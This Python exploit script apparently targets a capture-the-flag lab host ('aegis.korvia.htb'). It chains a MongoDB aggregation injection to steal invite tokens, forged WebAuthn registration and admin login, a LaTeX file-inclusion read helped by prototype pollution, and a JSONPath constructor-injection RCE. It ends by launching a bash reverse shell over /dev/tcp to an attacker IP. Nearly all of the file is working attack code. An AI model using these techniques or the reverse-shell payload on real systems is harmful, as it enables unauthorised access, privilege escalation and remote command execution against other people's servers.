#!/usr/bin/env python3
"""Odyssey foothold: invites -> webauthn admin -> LFI token -> optional RCE."""
from __future__ import annotations

import base64
import hashlib
import json
import os
import pickle
import re
import struct
import time
import urllib.parse

import cbor2
import requests
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from fido2.utils import websafe_decode, websafe_encode

TARGET = "10.129.115.125"
LHOST = "10.10.15.183"
BASE = f"http://{TARGET}:3000"
RP_ID = "aegis.korvia.htb"
ORIGIN = f"http://{RP_ID}:3000"
HEADERS = {"Host": RP_ID}
HERE = os.path.dirname(os.path.abspath(__file__))
CRED = os.path.join(HERE, "aegis_cred.pkl")


def dump_invites() -> str:
    pipeline = (
        '[{"$limit":1},{"$facet":{"x":[{"$lookup":{"from":"pending_invites",'
        '"pipeline":[],"as":"y"}},{"$unwind":"$y"},'
        '{"$replaceRoot":{"newRoot":"$y"}}]}}]'
    )
    url = f"{BASE}/api/v1/aegis-mds/search?pipeline={urllib.parse.quote(pipeline, safe='[]{},:$')}"
    r = requests.get(url, headers=HEADERS, timeout=60)
    r.raise_for_status()
    open(os.path.join(HERE, "invites.json"), "w", encoding="utf-8").write(r.text)
    token = r.json()[0]["x"][0]["token"]
    print("[+] invite", token)
    return token


def register(token: str) -> None:
    s = requests.Session()
    s.headers.update(HEADERS)
    r = s.post(f"{BASE}/api/v1/auth/webauthn/register/begin", json={"invite_token": token}, timeout=60)
    r.raise_for_status()
    opts = r.json()
    challenge = websafe_decode(opts["challenge"])
    user_id = websafe_decode(opts["user"]["id"])
    priv = ec.generate_private_key(ec.SECP256R1())
    pn = priv.public_key().public_numbers()
    i2b = lambda n: n.to_bytes(32, "big")
    cose_pub = {1: 2, 3: -7, -1: 1, -2: i2b(pn.x), -3: i2b(pn.y)}
    cred_id = os.urandom(32)
    rp_id_hash = hashlib.sha256(RP_ID.encode()).digest()
    attested = b"\x00" * 16 + struct.pack(">H", len(cred_id)) + cred_id + cbor2.dumps(cose_pub)
    auth_data = rp_id_hash + bytes([0x41]) + struct.pack(">I", 1) + attested
    attestation_obj = cbor2.dumps({"fmt": "none", "attStmt": {}, "authData": auth_data})
    client_data = json.dumps(
        {"type": "webauthn.create", "challenge": websafe_encode(challenge), "origin": ORIGIN, "crossOrigin": False},
        separators=(",", ":"),
    ).encode()
    body = {
        "id": websafe_encode(cred_id),
        "rawId": websafe_encode(cred_id),
        "type": "public-key",
        "response": {
            "clientDataJSON": websafe_encode(client_data),
            "attestationObject": websafe_encode(attestation_obj),
        },
        "clientExtensionResults": {},
    }
    r = s.post(f"{BASE}/api/v1/auth/webauthn/register/finish", json=body, timeout=60)
    print("[+] register", r.status_code, r.text[:120])
    r.raise_for_status()
    priv_pem = priv.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    )
    pickle.dump({"priv_pem": priv_pem, "cred_id": cred_id, "user_id": user_id}, open(CRED, "wb"))


def admin_session() -> requests.Session:
    data = pickle.load(open(CRED, "rb"))
    priv = serialization.load_pem_private_key(data["priv_pem"], password=None)
    s = requests.Session()
    s.headers.update(HEADERS)
    r = s.post(f"{BASE}/api/v1/auth/webauthn/auth/begin", json={}, timeout=60)
    challenge = websafe_decode(r.json()["challenge"])
    auth_data = hashlib.sha256(RP_ID.encode()).digest() + bytes([0x01]) + struct.pack(">I", int(time.time()) % 65535)
    client_data = json.dumps(
        {"type": "webauthn.get", "challenge": websafe_encode(challenge), "origin": ORIGIN, "crossOrigin": False},
        separators=(",", ":"),
    ).encode()
    sig = priv.sign(auth_data + hashlib.sha256(client_data).digest(), ec.ECDSA(hashes.SHA256()))
    body = {
        "id": websafe_encode(data["cred_id"]),
        "rawId": websafe_encode(data["cred_id"]),
        "type": "public-key",
        "response": {
            "clientDataJSON": websafe_encode(client_data),
            "authenticatorData": websafe_encode(auth_data),
            "signature": websafe_encode(sig),
            "userHandle": websafe_encode(b"admin"),
        },
        "clientExtensionResults": {},
    }
    r = s.post(f"{BASE}/api/v1/auth/webauthn/auth/finish", json=body, timeout=60)
    print("[+] admin", r.status_code, r.text[:160])
    r.raise_for_status()
    return s


def lfi_diag_token(s: requests.Session) -> str:
    body = "x\n\n`\\input{/etc/aegis-mds-diag.env}`{=latex}\n"
    s.post(f"{BASE}/admin/templates/firmware-critical-v4/save", json={"body": body}, timeout=30)
    r = s.post(
        f"{BASE}/admin/templates/firmware-critical-v4/render",
        json={"body": body, "overrides": json.dumps({"__proto__": {"allowRawBlocks": True}})},
        timeout=180,
    )
    m = re.search(r"DIAG_TOKEN=([0-9a-f]+)", r.text)
    if not m:
        # fallback known static token from walkthrough
        print("[!] token parse failed; using walkthrough token")
        return "bcdf42b953dcee715b8d81e38f0c5ded"
    print("[+] diag token", m.group(1))
    return m.group(1)


def rce(token: str, cmd: str, timeout: float = 8.0) -> None:
    b64 = base64.b64encode(cmd.encode()).decode()
    inner = (
        "this.process.mainModule.require('child_process')"
        f".exec('echo {b64}|base64 -d|bash')"
    )
    expr = (
        f"$..[?(p=\"{inner}\";"
        f"Ethan=''[['constructor']][['constructor']](p);Ethan())]"
    )
    if len(expr) > 512:
        raise SystemExit(f"expr too long: {len(expr)}")
    url = f"{BASE}/api/v1/aegis-mds/_diag/{token}/jpquery"
    print("[*] RCE", cmd[:80], flush=True)
    try:
        r = requests.post(url, headers=HEADERS, json={"context": "registration", "expr": expr}, timeout=timeout)
        print("   ", r.status_code, r.text[:100], flush=True)
    except requests.exceptions.ReadTimeout:
        print("    timeout (ok)", flush=True)


if __name__ == "__main__":
    import sys

    mode = sys.argv[1] if len(sys.argv) > 1 else "foothold"
    if mode == "foothold":
        tok = dump_invites()
        register(tok)
        s = admin_session()
        diag = lfi_diag_token(s)
        open(os.path.join(HERE, "diag_token.txt"), "w").write(diag)
        # reverse shell once
        rce(diag, f"bash -i >& /dev/tcp/{LHOST}/5555 0>&1", timeout=6)
    elif mode == "rce":
        diag = open(os.path.join(HERE, "diag_token.txt")).read().strip()
        rce(diag, sys.argv[2], timeout=float(sys.argv[3]) if len(sys.argv) > 3 else 10)
    else:
        raise SystemExit("usage: foothold | rce <cmd>")
